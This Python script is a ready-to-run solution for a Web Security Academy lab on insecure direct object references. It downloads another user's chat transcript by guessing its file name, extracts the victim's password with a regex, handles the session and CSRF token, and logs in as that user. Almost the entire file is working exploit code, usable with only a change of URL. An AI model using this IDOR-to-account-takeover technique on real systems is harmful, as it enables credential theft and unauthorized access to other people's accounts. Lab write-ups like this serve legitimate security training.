###############################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: Insecure direct object references
#
# Steps: 1. Fetch 1.txt log file
#        2. Extract carlos password from the log file
#        3. Login as carlos
#
################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a9a005b037177be82ab0b150000003a.web-security-academy.net"

try: 
    # fetch 1.txt log file
    admin_profile = requests.get(f"{url}/download-transcript/1.txt")

except:
    print(Fore.RED + "[!] Failed to fetch 1.txt log file through exception")
    exit(1)


print(Fore.WHITE + "1. Fetching 1.txt log file.. " + Fore.GREEN + "OK")

# extract the carlos password from source code
carlos_pass = re.findall(r"password is (.*)\.", admin_profile.text)[0]

print(Fore.WHITE + "2. Extracting password from the log file.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + carlos_pass)

try:  
    # fetch the login page to get valid session and csrf token
    login_page = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1)

print(Fore.WHITE + "3. Fetching login page to get valid session and csrf token.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

# set credentials
data = {
    "username": "carlos",
    "password": carlos_pass,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as carlos
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as carlos through exception")
    exit(1)

# if you logged in successfully
if login.status_code == 302:
    print(Fore.WHITE + "4. Logging in as carlos.. " + Fore.GREEN + "OK")
    
    # get the new session
    new_session = login.cookies.get("session")
    
    # set session cookie
    cookies = {
        "session": new_session
    }
    
    try:  
        # fetch carlos profile
        carlos = requests.get(f"{url}/my-account", cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to fetch carlos profile through exception")
        exit(1)

    print(Fore.WHITE + "5. Fetching carlos profile.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to login as carlos")


